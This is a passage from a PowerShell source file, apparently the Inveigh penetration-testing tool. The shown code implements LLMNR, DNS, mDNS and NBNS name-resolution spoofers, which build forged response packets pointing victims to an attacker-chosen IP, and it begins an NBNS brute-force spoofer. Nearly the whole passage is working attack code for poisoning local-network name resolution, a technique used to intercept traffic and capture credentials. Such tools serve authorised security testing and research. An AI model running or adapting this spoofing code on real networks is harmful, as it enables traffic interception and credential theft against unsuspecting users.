+\n                                                    0x00,0x04 +\n                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()\n            \n                            $LLMNR_response_packet = 0x14,0xeb +\n                                                        $source_port[1,0] +\n                                                        $UDP_length[1,0] +\n                                                        0x00,0x00 +\n                                                        $payload_bytes[0,1] +\n                                                        0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +\n                                                        $LLMNR_response_data\n                \n                            $LLMNR_query_string = [System.Text.Encoding]::UTF8.GetString($payload_bytes[13..($payload_bytes.Length - 4)]) -replace \"`0\",\"\"\n\n                            if(!$inveigh.request_table.ContainsKey($LLMNR_query_string))\n                            {\n                                $inveigh.request_table.Add($LLMNR_query_string.ToLower(),[Array]$source_IP.IPAddressToString)\n                                $inveigh.request_table_updated = $true\n                            }\n                            else\n                            {\n                                $inveigh.request_table.$LLMNR_query_string += $source_IP.IPAddressToString\n                                $inveigh.request_table_updated = $true\n                            }\n\n                            $LLMNR_request_ignore = $false\n                \n                            if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $LLMNR_query_string -and $source_IP -ne $IP)\n                            {\n\n                                if(($LLMNR_learning_log.Exists({param($s) $s -like \"20* $LLMNR_query_string\"})))\n                                {\n                                    $LLMNR_learning_queue_time = [DateTime]$LLMNR_learning_log.Find({param($s) $s -like \"20* $LLMNR_query_string\"}).SubString(0,19)\n\n                                    if((Get-Date) -ge $LLMNR_learning_queue_time.AddMinutes($SpooferLearningInterval))\n                                    {\n                                        $LLMNR_learning_log.RemoveAt($LLMNR_learning_log.FindIndex({param($s) $s -like \"20* $LLMNR_query_string\"}))\n                                        $LLMNR_learning_send = $true\n                                    }\n                                    else\n                                    {\n                                        $LLMNR_learning_send = $false\n                                    }\n\n                                }\n                                else\n                                {           \n                                    $LLMNR_learning_send = $true\n                                }\n                                \n                                if($LLMNR_learning_send)\n                                {\n                                    $LLMNR_transaction_ID = [String](1..2 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})\n                                    $LLMNR_transaction_ID_bytes = $LLMNR_transaction_ID.Split(\" \") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                                    $LLMNR_transaction_ID = $LLMNR_transaction_ID -replace \" \",\"-\"\n                                    $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient\n                                    $LLMNR_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]\n\n                                    $LLMNR_request_packet = $LLMNR_transaction_ID_bytes +\n                                                            0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +\n                                                            ($LLMNR_hostname_bytes.Length - 1) +\n                                                            $LLMNR_hostname_bytes +\n                                                            0x00,0x01,0x00,0x01\n\n                                    $LLMNR_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]\"224.0.0.252\",5355)\n                                    $LLMNR_UDP_client.Connect($LLMNR_learning_destination_endpoint)\n                                    $LLMNR_UDP_client.Send($LLMNR_request_packet,$LLMNR_request_packet.Length)\n                                    $LLMNR_UDP_client.Close()\n                                    $LLMNR_learning_log.Add(\"$(Get-Date -format s) $LLMNR_transaction_ID $LLMNR_query_string\") > $null\n                                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] LLMNR request $LLMNR_query_string sent to 224.0.0.252\") > $null\n                                }\n\n                            }\n\n                            $LLMNR_response_message = Get-SpooferResponseMessage -QueryString $LLMNR_query_string -Type \"LLMNR\" -Enabled $LLMNR\n                            $LLMNR_response_type = $LLMNR_response_message[0]\n                            $LLMNR_response_message = $LLMNR_response_message[1]\n\n                            if($LLMNR_response_message -eq '[response sent]')\n                            {\n\n                                if($SpooferLearning -eq 'N' -or !$LLMNR_learning_log.Exists({param($s) $s -like \"* \" + [System.BitConverter]::ToString($payload_bytes[0..1]) + \" *\"}))\n                                {\n                                    $LLMNR_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)\n                                    $LLMNR_send_socket.SendBufferSize = 1024\n                                    $LLMNR_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) \n                                    $LLMNR_send_socket.SendTo($LLMNR_response_packet,$LLMNR_destination_point) > $null\n                                    $LLMNR_send_socket.Close()\n                                }\n                                else\n                                {\n                                    $LLMNR_request_ignore = $true\n                                }\n\n                            }\n                           \n                            if(!$LLMNR_request_ignore)\n                            {\n                                $inveigh.output_queue.Add(\"$LLMNR_response_type [$(Get-Date -format s)] LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message\") > $null\n                            }\n\n                        }\n\n                    }\n\n                }\n\n                switch($endpoint_source_port)\n                {\n\n                    5355 # LLMNR Response\n                    {\n                    \n                        if($SpooferLearning -eq 'Y' -and $LLMNR_learning_log.Exists({param($s) $s -like \"* \" + [System.BitConverter]::ToString($payload_bytes[0..1]) + \" *\"}))\n                        {\n                            $LLMNR_query_string = [System.Text.Encoding]::UTF8.GetString($payload_bytes[13..($payload_bytes.Length - 4)]) -replace \"`0\",\"\"\n                            [Byte[]]$LLMNR_response_IP_bytes = $payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length)]\n                            $LLMNR_response_IP = [System.Net.IPAddress]$LLMNR_response_IP_bytes\n                            $LLMNR_response_IP = $LLMNR_response_IP.IPAddressToString\n                            \n                            if($inveigh.valid_host_list -notcontains $LLMNR_query_string)\n                            {\n                                $inveigh.valid_host_list.Add($LLMNR_query_string) > $null\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $LLMNR_query_string LLMNR response $LLMNR_response_IP received from $source_IP [added to valid host list]\") > $null\n                            }\n                            \n                        }\n\n                    }\n\n                }\n\n                if($Pcap -and ($PcapUDP -contains $endpoint_source_port -or $PcapUDP -contains $destination_port -or $PcapUDP -contains 'All'))\n                {\n\n                    if($payload_bytes)\n                    {\n                        $pcap_epoch_time = ([datetime]::UtcNow)-(Get-Date \"1/1/1970\")\n                        $pcap_length = [System.BitConverter]::GetBytes($packet_length + 14)\n                        \n                        $pcap_packet = [System.BitConverter]::GetBytes([Int][Math]::Truncate($pcap_epoch_time.TotalSeconds)) + \n                            [System.BitConverter]::GetBytes($pcap_epoch_time.Milliseconds) + # should be microseconds but probably doesn't matter\n                            $pcap_length +\n                            $pcap_length +\n                            (,0x00 * 12) +\n                            0x08,0x00 +\n                            $byte_data[0..($packet_length - 1)]\n\n                        switch ($Pcap)\n                        {\n\n                            'File'\n                            {\n\n                                try\n                                {\n                                    $pcap_file.Write($pcap_packet,0,$pcap_packet.Count)    \n                                }\n                                catch\n                                {\n                                    $error_message = $_.Exception.Message\n                                    $error_message = $error_message -replace \"`n\",\"\"\n                                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n                                }\n                        \n                            }\n\n                            'Memory'\n                            {\n                                $inveigh.pcap.AddRange($pcap_packet) \n                            }\n\n                        }\n\n                    }\n\n                }\n\n            }\n\n        }\n\n    }\n\n    $binary_reader.Close()\n    $memory_stream.Dispose()\n    $memory_stream.Close()\n    $pcap_file.Close()\n}\n\n# Unprivileged DNS Spoofer ScriptBlock \n$DNS_spoofer_scriptblock = \n{\n    param ($Inspect,$DNSTTL,$SpooferIP)\n\n    $DNS_running = $true\n    $DNS_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,53)\n\n    try\n    {\n        $DNS_UDP_client = New-Object System.Net.Sockets.UdpClient 53\n    }\n    catch\n    {\n        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] Error starting DNS spoofer\") > $null\n        $error_message = $_.Exception.Message\n        $error_message = $error_message -replace \"`n\",\"\"\n        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        $DNS_running = $false\n    }\n\n    $DNS_UDP_client.Client.ReceiveTimeout = 5000\n    $DNS_TTL_bytes = [System.BitConverter]::GetBytes($DNSTTL)\n    [Array]::Reverse($DNS_TTL_bytes)\n\n    while($inveigh.running -and $DNS_running)\n    {   \n\n        try\n        {\n            $DNS_request_data = $DNS_UDP_client.Receive([Ref]$DNS_listener_endpoint)\n        }\n        catch\n        {\n            $DNS_UDP_client.Close()\n            $DNS_UDP_client = New-Object System.Net.Sockets.UdpClient 53\n            $DNS_UDP_client.Client.ReceiveTimeout = 5000\n        }\n        \n        if($DNS_request_data -and [System.BitConverter]::ToString($DNS_request_data[10..11]) -ne '00-01')\n        {\n            $DNS_query_string = Get-NameQueryString 12 $DNS_request_data\n            $DNS_response_data = $DNS_request_data[12..($DNS_query_string.Length + 13)]\n            $DNS_response_type = \"[+]\"\n\n            $DNS_response_packet = $DNS_request_data[0,1] +\n                                    0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +\n                                    $DNS_response_data +\n                                    0x00,0x01,0x00,0x01 +\n                                    $DNS_response_data +\n                                    0x00,0x01,0x00,0x01 +\n                                    $DNS_TTL_bytes +\n                                    0x00,0x04 +\n                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()\n\n            $source_IP = $DNS_listener_endpoint.Address\n            $DNS_response_message = Get-SpooferResponseMessage -QueryString $DNS_query_string -Type \"DNS\" -Enabled $DNS\n            $DNS_response_type = $DNS_response_message[0]\n            $DNS_response_message = $DNS_response_message[1]\n\n            if($DNS_response_message -eq '[response sent]')\n            {\n                $DNS_destination_endpoint = New-Object System.Net.IPEndpoint($DNS_listener_endpoint.Address,$DNS_listener_endpoint.Port)\n                $DNS_UDP_client.Connect($DNS_destination_endpoint)\n                $DNS_UDP_client.Send($DNS_response_packet,$DNS_response_packet.Length)\n                $DNS_UDP_client.Close()\n                $DNS_UDP_client = New-Object System.Net.Sockets.UdpClient 53\n                $DNS_UDP_client.Client.ReceiveTimeout = 5000\n            }\n           \n            $inveigh.output_queue.Add(\"$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string received from $source_IP $DNS_response_message\") > $null\n            $DNS_request_data = $null\n        }\n        \n    }\n\n    $DNS_UDP_client.Close()\n}\n\n# Unprivileged LLMNR Spoofer ScriptBlock \n$LLMNR_spoofer_scriptblock = \n{\n    param ($Inspect,$LLMNRTTL,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$SpooferNonprintable)\n\n    $LLMNR_running = $true\n    $LLMNR_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)\n\n    try\n    {\n        $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient\n        $LLMNR_UDP_client.ExclusiveAddressUse = $false\n        $LLMNR_UDP_client.Client.SetSocketOption(\"Socket\", \"ReuseAddress\", $true)\n        $LLMNR_UDP_client.Client.Bind($LLMNR_listener_endpoint)\n    }\n    catch\n    {\n        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] Error starting LLMNR spoofer\") > $null\n        $error_message = $_.Exception.Message\n        $error_message = $error_message -replace \"`n\",\"\"\n        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        $LLMNR_running = $false\n    }\n\n    $LLMNR_multicast_group = [IPAddress]\"224.0.0.252\"\n    $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)\n    $LLMNR_UDP_client.Client.ReceiveTimeout = 5000\n    $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)\n    [Array]::Reverse($LLMNR_TTL_bytes)\n\n    while($inveigh.running -and $LLMNR_running)\n    {   \n\n        try\n        {\n            $LLMNR_request_data = $LLMNR_UDP_client.Receive([Ref]$LLMNR_listener_endpoint)\n        }\n        catch\n        {      \n            $LLMNR_UDP_client.Close()\n            $LLMNR_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)\n            $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient\n            $LLMNR_UDP_client.ExclusiveAddressUse = $false\n            $LLMNR_UDP_client.Client.SetSocketOption(\"Socket\", \"ReuseAddress\", $true)\n            $LLMNR_UDP_client.Client.Bind($LLMNR_listener_endpoint)\n            $LLMNR_multicast_group = [IPAddress]\"224.0.0.252\"\n            $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)\n            $LLMNR_UDP_client.Client.ReceiveTimeout = 5000\n        }\n\n        if($LLMNR_request_data -and [System.BitConverter]::ToString($LLMNR_request_data[($LLMNR_request_data.Length - 4)..($LLMNR_request_data.Length - 3)]) -ne '00-1c') # ignore AAAA for now\n        {\n\n            $LLMNR_response_packet = $LLMNR_request_data[0,1] +\n                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +\n                                     $LLMNR_request_data[12..$LLMNR_request_data.Length] +\n                                     $LLMNR_request_data[12..$LLMNR_request_data.Length] +\n                                     $LLMNR_TTL_bytes +\n                                     0x00,0x04 +\n                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()\n        \n            $LLMNR_query_string = [Text.Encoding]::UTF8.GetString($LLMNR_request_data[13..($LLMNR_request_data[12] + 12)])     \n            $source_IP = $LLMNR_listener_endpoint.Address\n            $LLMNR_response_type = \"[+]\"\n\n            if(!$inveigh.request_table.ContainsKey($LLMNR_query_string))\n            {\n                $inveigh.request_table.Add($LLMNR_query_string.ToLower(),[Array]$source_IP.IPAddressToString)\n                $inveigh.request_table_updated = $true\n            }\n            else\n            {\n                $inveigh.request_table.$LLMNR_query_string += $source_IP.IPAddressToString\n                $inveigh.request_table_updated = $true\n            }\n\n            $LLMNR_response_message = Get-SpooferResponseMessage -QueryString $LLMNR_query_string -Type \"LLMNR\" -Enabled $LLMNR\n            $LLMNR_response_type = $LLMNR_response_message[0]\n            $LLMNR_response_message = $LLMNR_response_message[1]\n\n            if($LLMNR_response_message -eq '[response sent]')\n            {\n                $LLMNR_destination_endpoint = New-Object Net.IPEndpoint($LLMNR_listener_endpoint.Address,$LLMNR_listener_endpoint.Port)\n                $LLMNR_UDP_client.Connect($LLMNR_destination_endpoint)\n                $LLMNR_UDP_client.Send($LLMNR_response_packet,$LLMNR_response_packet.Length)\n                $LLMNR_UDP_client.Close()\n                $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient\n                $LLMNR_UDP_client.ExclusiveAddressUse = $false\n                $LLMNR_UDP_client.Client.SetSocketOption(\"Socket\", \"ReuseAddress\", $true)\n                $LLMNR_UDP_client.Client.Bind($LLMNR_listener_endpoint)\n                $LLMNR_multicast_group = [IPAddress]\"224.0.0.252\"\n                $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)\n                $LLMNR_UDP_client.Client.ReceiveTimeout = 5000\n            }\n        \n            if($LLMNR_request_data)\n            {\n                $inveigh.output_queue.Add(\"$LLMNR_response_type [$(Get-Date -format s)] LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message\") > $null\n            }\n\n            $LLMNR_request_data = $null\n        }\n\n    }\n\n    $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] leaving\") > $null\n    $LLMNR_UDP_client.Close()\n }\n\n# Unprivileged mDNS Spoofer ScriptBlock \n$mDNS_spoofer_scriptblock = \n{\n    param ($Inspect,$mDNSTTL,$mDNSTypes,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore)\n\n    $mDNS_running = $true\n    $mDNS_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,5353)\n\n    try\n    {\n        $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient\n        $mDNS_UDP_client.ExclusiveAddressUse = $false\n        $mDNS_UDP_client.Client.SetSocketOption(\"Socket\", \"ReuseAddress\", $true)\n        $mDNS_UDP_client.Client.Bind($mDNS_listener_endpoint)\n\n    }\n    catch\n    {\n        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] Error starting mDNS spoofer\") > $null\n        $error_message = $_.Exception.Message\n        $error_message = $error_message -replace \"`n\",\"\"\n        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        $mDNS_running = $false\n    }\n\n    $mDNS_multicast_group = [IPAddress]\"224.0.0.251\"\n    $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)\n    $mDNS_UDP_client.Client.ReceiveTimeout = 5000\n    $mDNS_TTL_bytes = [System.BitConverter]::GetBytes($mDNSTTL)\n    [Array]::Reverse($mDNS_TTL_bytes)\n\n    while($inveigh.running -and $mDNS_running)\n    {   \n\n        try\n        {\n            $mDNS_request_data = $mDNS_UDP_client.Receive([Ref]$mDNS_listener_endpoint)\n        }\n        catch\n        {\n            $mDNS_UDP_client.Close()\n            $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient\n            $mDNS_UDP_client.ExclusiveAddressUse = $false\n            $mDNS_UDP_client.Client.SetSocketOption(\"Socket\", \"ReuseAddress\", $true)\n            $mDNS_UDP_client.Client.Bind($mDNS_listener_endpoint)\n            $mDNS_multicast_group = [IPAddress]\"224.0.0.251\"\n            $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)\n            $mDNS_UDP_client.Client.ReceiveTimeout = 5000\n        }\n\n        if(([System.BitConverter]::ToString($mDNS_request_data)).EndsWith(\"-00-01-80-01\") -and [System.BitConverter]::ToString($mDNS_request_data[4..11]) -eq \"00-01-00-00-00-00-00-00\")\n        {\n            $source_IP = $mDNS_listener_endpoint.Address\n            $mDNS_query_string_full = Get-NameQueryString 12 $mDNS_request_data\n            $mDNS_query_string = ($mDNS_query_string_full.Split(\".\"))[0]\n            $mDNS_response_type = \"[+]\"\n\n            $mDNS_response_packet = $mDNS_request_data[0,1] +\n                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +\n                                    $mDNS_request_data[12..($mDNS_query_string_full.Length + 13)] +\n                                    0x00,0x01,0x00,0x01 +\n                                    $mDNS_TTL_bytes +\n                                    0x00,0x04 +\n                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()\n            \n            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type \"mDNS\" -mDNSType \"QU\" -Enabled $mDNS\n            $mDNS_response_type = $mDNS_response_message[0]\n            $mDNS_response_message = $mDNS_response_message[1]\n\n            if($mDNS_response_message -eq '[response sent]')\n            {\n                $mDNS_destination_endpoint = New-Object Net.IPEndpoint($mDNS_listener_endpoint.Address,$mDNS_listener_endpoint.Port)\n                $mDNS_UDP_client.Connect($mDNS_destination_endpoint)\n                $mDNS_UDP_client.Send($mDNS_response_packet,$mDNS_response_packet.Length)\n                $mDNS_UDP_client.Close()\n                $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient\n                $mDNS_UDP_client.ExclusiveAddressUse = $false\n                $mDNS_UDP_client.Client.SetSocketOption(\"Socket\", \"ReuseAddress\", $true)\n                $mDNS_UDP_client.Client.Bind($mDNS_listener_endpoint)\n                $mDNS_multicast_group = [IPAddress]\"224.0.0.251\"\n                $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)\n                $mDNS_UDP_client.Client.ReceiveTimeout = 5000\n            }\n        \n            if($mDNS_request_data)\n            {\n                $inveigh.output_queue.Add(\"$mDNS_response_type [$(Get-Date -format s)] mDNS(QU) request $mDNS_query_string_full received from $source_IP $mDNS_response_message\") > $null\n            }\n\n            $mDNS_request_data = $null\n        }\n        elseif(([System.BitConverter]::ToString($mDNS_request_data)).EndsWith(\"-00-01\") -and ([System.BitConverter]::ToString(\n            $mDNS_request_data[4..11]) -eq \"00-01-00-00-00-00-00-00\" -or [System.BitConverter]::ToString($mDNS_request_data[4..11]) -eq \"00-02-00-00-00-00-00-00\"))\n        {\n            $source_IP = $mDNS_listener_endpoint.Address\n            $mDNS_query_string_full = Get-NameQueryString 12 $mDNS_request_data\n            $mDNS_query_string = ($mDNS_query_string_full.Split(\".\"))[0]\n            $mDNS_response_type = \"[+]\"\n\n            $mDNS_response_packet = $mDNS_request_data[0,1] +\n                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +\n                                    $mDNS_request_data[12..($mDNS_query_string_full.Length + 13)] +\n                                    0x00,0x01,0x00,0x01 +\n                                    $mDNS_TTL_bytes +\n                                    0x00,0x04 +\n                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()        \n                \n            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type \"mDNS\" -mDNSType \"QM\" -Enabled $mDNS\n            $mDNS_response_type = $mDNS_response_message[0]\n            $mDNS_response_message = $mDNS_response_message[1]\n\n            if($mDNS_response_message -eq '[response sent]')\n            {\n                $mDNS_destination_endpoint = New-Object Net.IPEndpoint([IPAddress]\"224.0.0.251\",5353)\n                $mDNS_UDP_client.Connect($mDNS_destination_endpoint)\n                $mDNS_UDP_client.Send($mDNS_response_packet,$mDNS_response_packet.Length)\n                $mDNS_UDP_client.Close()\n                $mDNS_UDP_client = new-Object System.Net.Sockets.UdpClient 5353\n                $mDNS_multicast_group = [IPAddress]\"224.0.0.251\"\n                $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)\n                $mDNS_UDP_client.Client.ReceiveTimeout = 5000\n            }\n\n            if($mDNS_request_data)                   \n            {\n                $inveigh.output_queue.Add(\"$mDNS_response_type [$(Get-Date -format s)] mDNS(QM) request $mDNS_query_string_full received from $source_IP $mDNS_response_message\") > $null\n            }\n\n            $mDNS_request_data = $null\n        }\n\n    }\n\n    $mDNS_UDP_client.Close()\n}\n\n# Unprivileged NBNS Spoofer ScriptBlock\n$NBNS_spoofer_scriptblock = \n{\n    param ($Inspect,$IP,$NBNSTTL,$NBNSTypes,$SpooferIP,$SpooferHostsIgnore,$SpooferHostsReply,\n        $SpooferIPsIgnore,$SpooferIPsReply,$SpooferNonprintable)\n\n    $NBNS_running = $true\n    $NBNS_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Broadcast,137)\n\n    try\n    {\n        $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137\n    }\n    catch\n    {\n        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] Error starting NBNS spoofer\") > $null\n        $error_message = $_.Exception.Message\n        $error_message = $error_message -replace \"`n\",\"\"\n        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        $NBNS_running = $false\n    }\n\n    $NBNS_UDP_client.Client.ReceiveTimeout = 5000\n    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)\n    [Array]::Reverse($NBNS_TTL_bytes)\n\n    while($inveigh.running -and $NBNS_running)\n    {\n        \n        try\n        {\n            $NBNS_request_data = $NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint)\n        }\n        catch\n        {\n            $NBNS_UDP_client.Close()\n            $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137\n            $NBNS_UDP_client.Client.ReceiveTimeout = 5000\n        }\n\n        if($NBNS_request_data -and [System.BitConverter]::ToString($NBNS_request_data[10..11]) -ne '00-01')\n        {\n            $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)\n            [Array]::Reverse($NBNS_TTL_bytes)\n\n            $NBNS_response_packet = $NBNS_request_data[0,1] +\n                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +\n                                    $NBNS_request_data[13..$NBNS_request_data.Length] +\n                                    $NBNS_TTL_bytes +\n                                    0x00,0x06,0x00,0x00 +\n                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +\n                                    0x00,0x00,0x00,0x00\n\n            $source_IP = $NBNS_listener_endpoint.Address\n            $NBNS_query_type = [System.BitConverter]::ToString($NBNS_request_data[43..44])\n            $NBNS_query_type = Get-NBNSQueryType $NBNS_query_type\n            $NBNS_type = $NBNS_request_data[47]\n            $NBNS_response_type = \"[+]\"\n            $NBNS_query = [System.BitConverter]::ToString($NBNS_request_data[13..($NBNS_request_data.Length - 4)])\n            $NBNS_query = $NBNS_query -replace \"-00\",\"\"\n            $NBNS_query = $NBNS_query.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n            $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)\n            $NBNS_query_string_encoded_check = $NBNS_query_string_encoded\n            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf(\"CA\"))\n            $NBNS_query_string_subtracted = $null\n            $NBNS_query_string = $null\n            $n = 0\n                            \n            do\n            {\n                $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)\n                $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))\n                $n += 1\n            }\n            until($n -ge ($NBNS_query_string_encoded.Length))\n                    \n            $n = 0\n                    \n            do\n            {\n                $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))\n                $n += 2\n            }\n            until($n -ge ($NBNS_query_string_subtracted.Length) -or $NBNS_query_string.Length -eq 15)\n\n            if($NBNS_query_string_encoded_check.StartsWith(\"ABAC\") -and $NBNS_query_string_encoded_check.EndsWith(\"ACAB\"))\n            {\n                $NBNS_query_string = $NBNS_query_string.Substring(2)\n                $NBNS_query_string = $NBNS_query_string.Substring(0, $NBNS_query_string.Length - 1)\n                $NBNS_query_string = \"<01><02>\" + $NBNS_query_string + \"<02>\"\n            }\n\n            if($NBNS_query_string -notmatch '[^\\x00-\\x7F]+')\n            {\n\n                if(!$inveigh.request_table.ContainsKey($NBNS_query_string))\n                {\n                    $inveigh.request_table.Add($NBNS_query_string.ToLower(),[Array]$source_IP.IPAddressToString)\n                    $inveigh.request_table_updated = $true\n                }\n                else\n                {\n                    $inveigh.request_table.$NBNS_query_string += $source_IP.IPAddressToString\n                    $inveigh.request_table_updated = $true\n                }\n\n            }\n            \n            $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type \"NBNS\" -Enabled $NBNS -NBNSType $NBNS_type\n            $NBNS_response_type = $NBNS_response_message[0]\n            $NBNS_response_message = $NBNS_response_message[1]\n\n            if($NBNS_response_message -eq '[response sent]')\n            {\n                $NBNS_destination_endpoint = New-Object System.Net.IPEndpoint($NBNS_listener_endpoint.Address,$NBNS_listener_endpoint.Port)\n                $NBNS_UDP_client.Connect($NBNS_destination_endpoint)\n                $NBNS_UDP_client.Send($NBNS_response_packet,$NBNS_response_packet.Length)\n                $NBNS_UDP_client.Close()\n                $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137\n                $NBNS_UDP_client.Client.ReceiveTimeout = 5000\n            }\n\n            if($NBNS_request_data)                   \n            {\n                $inveigh.output_queue.Add(\"$NBNS_response_type [$(Get-Date -format s)] NBNS request $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message\") > $null    \n            }\n\n            $NBNS_request_data = $null\n        }\n\n    }\n\n    $NBNS_UDP_client.Close()\n }\n\n# NBNS BruteForce ScriptBlock\n$NBNS_bruteforce_spoofer_scriptblock = \n{\n    param ($NBNSBruteForceHost,$NBNSBruteForcePause,$NBNSBruteForceTarget,$NBNSTTL,$SpooferIP)\n   \n    $NBNSBruteForceHost = $NBNSBruteForceHost.ToUpper()\n\n    $hostname_bytes = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,\n                        0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00\n\n    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($NBNSBruteForceHost)\n    $hostname_encoded = [System.BitConverter]::ToString($hostname_encoded)\n    $hostname_encoded = $hostname_encoded.Replace(\"-\",\"\")\n    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($hostname_encoded)\n    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)\n    [Array]::Reverse($NBNS_TTL_bytes)\n\n    for($i=0; $i -lt $hostname_encoded.Count; $i++)\n    {\n\n        if($hostname_encoded[$i] -gt 64)\n        {\n            $hostname_bytes[$i] = $hostname_encoded[$i] + 10\n        }\n        else\n        {\n            $hostname_bytes[$i] = $hostname_encoded[$i] + 17\n        }\n    \n    }\n\n    $NBNS_response_packet = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +\n                            $hostname_bytes +\n                            0x00,0x20,0x00,0x01 +\n                            $NBNS_TTL_bytes +\n                            0x00,0x06,0x00,0x00 +\n                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +\n                            0x00,0x00,0x00,0x00\n\n    $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget\") > $null\n    $NBNS_paused = $false          \n    $NBNS_bruteforce_UDP_client = New-Object System.Net.Sockets.UdpClient(137)\n    $destination_IP = [System.Net.IPAddress]::Parse($NBNSBruteForceTarget)\n    $destination_point = New-Object Net.IPEndpoint($destination_IP,137)\n    $NBNS_bruteforce_UDP_client.Connect($destination_point)\n       \n    while($inveigh.running)\n    